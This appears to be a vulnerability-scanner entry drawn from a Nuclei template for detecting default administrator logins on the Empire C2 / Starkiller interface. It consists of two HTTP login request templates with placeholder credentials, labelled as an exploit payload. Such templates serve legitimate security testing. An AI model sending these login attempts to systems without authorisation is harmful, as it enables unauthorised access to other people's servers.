# Vulnerability: Empire C2 / Starkiller Interface - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`empirec2-default-login.yaml`)

## Description
Empire C2 / Starkiller Default Administrator Credentials Discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /token HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZwyedGcQU4FrcFV
Accept: application/json, text/plain, */*

------WebKitFormBoundaryoZwyedGcQU4FrcFV
Content-Disposition: form-data; name="username"

{{username}}
------WebKitFormBoundaryoZwyedGcQU4FrcFV
Content-Disposition: form-data; name="password"

{{password}}
------WebKitFormBoundaryoZwyedGcQU4FrcFV--

POST /api/admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{user}}","password":"{{pass}}"}
```

